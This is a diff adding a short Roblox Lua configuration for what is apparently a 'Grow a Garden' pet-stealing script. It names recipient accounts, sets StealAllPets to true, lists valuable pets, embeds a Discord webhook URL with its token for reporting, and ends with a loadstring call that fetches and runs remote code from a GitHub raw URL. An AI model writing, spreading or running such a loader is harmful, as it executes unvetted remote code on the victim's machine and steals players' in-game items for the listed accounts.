@@ -1,0 +1,11 @@
+local Users = {
+    'suraj1209a',
+    'gungun1209a',
+}
+local MinValue = 10000000
+local EveryonePing = "yes"
+local Webhook = "https://discord.com/api/webhooks/1385655332008886414/zFGSS0KvgwFrCdyu3ogH3idho7jxf7ituDmQ6AfjQA8gboxazmigBbG-ixFzo8pJvmMv"
+local StealAllPets = true
+local WhitelistPets = {"Red Fox", "Raccoon", "Dragonfly", "Disco Bee", "Queen Bee", "Butterfly", "Chicken Zombie", "Firefly"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/suraj1209a-ai/Grow-a-garden/refs/heads/main/GAG"))()
